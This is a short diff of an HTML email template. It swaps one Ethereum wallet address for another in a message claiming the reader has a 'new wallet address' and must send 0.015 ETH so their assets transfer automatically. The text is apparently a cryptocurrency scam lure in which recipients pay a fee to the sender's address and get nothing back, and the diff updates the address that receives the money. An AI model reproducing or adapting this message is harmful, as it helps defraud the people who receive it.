@@ -132,7 +132,7 @@ margin-right:auto}</style>
 <p style="color: rgb(146, 149, 152); font-family: &quot;Avenir Next&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-weight: 400; text-align: left; line-height: 1.3; font-size: 16px; margin: 0px 0px 20px; padding: 0px" align="left">
 
 Your new wallet address is 
-0x781d5F108BA74563319855306D20F0bA912631Eb
+0x1cF83978a049e98e57E9de4b1E015fFc7e59c0Ba
 
 Transfer 0.015Eth to automatically transfer your assets to your new wallet address.
 
